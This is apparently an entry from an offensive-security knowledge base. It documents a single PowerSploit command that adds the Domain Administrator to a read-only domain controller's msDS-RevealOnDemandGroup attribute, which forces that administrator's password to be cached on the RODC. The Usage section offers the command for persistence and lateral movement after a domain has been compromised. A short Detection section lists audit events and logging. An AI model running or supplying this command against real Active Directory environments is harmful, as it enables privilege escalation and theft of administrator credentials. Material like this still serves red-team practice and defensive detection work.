---
id: 4f6e4491-29b1-4748-bfb5-d442073e56c8
name: PowerShell-Set-RODC-RevealOnDemandGroup
type: code
language: ps1
verified: true
created_at: '2023-04-06T03:56:08.358669+00:00'
updated_at: '2023-04-10T20:26:02.547593+00:00'
platforms:
  - Windows
tags:
  - Active Directory
  - PowerSploit
  - RODC
validated: true
---

# PowerShell-Set-RODC-RevealOnDemandGroup

## Code

```ps1
PowerSploit> Set-DomainObject -Identity RODC$ -Set @{'msDS-RevealOnDemandGroup'=@('CN=Allowed RODC Password Replication Group,CN=Users,DC=domain,DC=local', 'CN=Administrator,CN=Users,DC=domain,DC=local')}
```

## Description

This PowerShell code snippet, executed within the PowerSploit module, modifies the msDS-RevealOnDemandGroup attribute of an RODC computer object in Active Directory. It appends the Domain Admin's DN to the attribute, forcing the RODC to replicate and cache the admin's password for potential offline use in privilege escalation attacks.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| RODC$ | The computer name of the RODC object | RODC$ |
| CN=Allowed RODC Password Replication Group,CN=Users,DC=domain,DC=local | DN of the default allowed replication group | CN=Allowed RODC Password Replication Group,CN=Users,DC=contoso,DC=com |
| CN=Administrator,CN=Users,DC=domain,DC=local | DN of the target Domain Admin account | CN=DomainAdmin,CN=Users,DC=contoso,DC=com |

## Usage

Load PowerSploit in a privileged PowerShell session on a domain-joined Windows machine, then execute this code after importing the ActiveDirectory module if needed. Use it as part of AD persistence or lateral movement procedures, such as after initial domain compromise, to prepare RODCs for credential caching in isolated environments.

## Detection

- Audit logs for directory service object modifications (Event ID 5136) on the PDC Emulator or RODC.
- PowerShell script block logging capturing Set-DomainObject invocations.
- Anomalous changes to msDS-RevealOnDemandGroup via regular AD health checks or tools like BloodHound.
- Network monitoring for LDAP writes to RODC objects from unauthorized sources.

## Related

- [[procedures/Add-Domain-Admin-to-RODC-Password-Replication-Group]]
- [[tools/PowerSploit]]
